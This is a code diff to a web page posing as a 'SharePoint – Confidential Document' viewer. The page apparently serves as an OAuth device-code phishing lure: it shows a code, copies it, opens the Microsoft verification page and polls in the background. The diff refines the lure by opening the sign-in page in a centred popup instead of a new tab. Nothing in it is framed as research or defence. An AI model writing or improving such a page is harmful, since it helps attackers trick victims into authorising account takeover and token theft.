@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SharePoint – Confidential Document</title>
     <style>
+        /* (same as before – no changes needed) */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: #f0f2f5;
@@ -317,7 +318,7 @@
             }
 
             // ------------------------------------------------------------------
-            // 🔥 UPDATED: Copy + Open new tab on click
+            // 🔥 UPDATED: Copy + Open popup window on click
             // ------------------------------------------------------------------
             copyBtn.addEventListener('click', function(e) {
                 const code = otpDisplay.textContent.trim();
@@ -326,22 +327,26 @@
                     return;
                 }
 
-                // 1. Perform the copy operation
+                function openPopup() {
+                    if (verificationUri) {
+                        const width = 800;
+                        const height = 600;
+                        const left = (screen.width / 2) - (width / 2);
+                        const top = (screen.height / 2) - (height / 2);
+                        const features = `width=${width},height=${height},left=${left},top=${top},resizable=yes,scrollbars=yes`;
+                        window.open(verificationUri, '_blank', features);
+                    }
+                }
+
                 if (navigator.clipboard && navigator.clipboard.writeText) {
                     navigator.clipboard.writeText(code).then(() => {
                         copyBtn.textContent = 'Copied!';
                         setTimeout(() => { copyBtn.textContent = 'Copy code'; }, 1800);
-                        // 2. Open Microsoft page in new tab
-                        if (verificationUri) {
-                            window.open(verificationUri, '_blank');
-                        }
+                        openPopup();
                     }).catch(() => fallbackCopy(code));
                 } else {
                     fallbackCopy(code);
-                    // 2. Open Microsoft page in new tab
-                    if (verificationUri) {
-                        window.open(verificationUri, '_blank');
-                    }
+                    openPopup();
                 }
             });
 
@@ -438,8 +443,7 @@
                     setCode(userCode);
                     copyBtn.disabled = false;
                     
-                    // 🔥 NO AUTO-OPEN. User must click "Copy code" to open the tab.
-                    spinnerText.textContent = 'Code ready. Click "Copy code" to open the Microsoft sign‑in page in a new tab.';
+                    spinnerText.textContent = 'Code ready. Click "Copy code" to open the Microsoft sign‑in page in a popup window.';
                     
                     if (pollInterval) clearInterval(pollInterval);
                     const intervalMs = (data.interval || 5) * 1000 + 500;
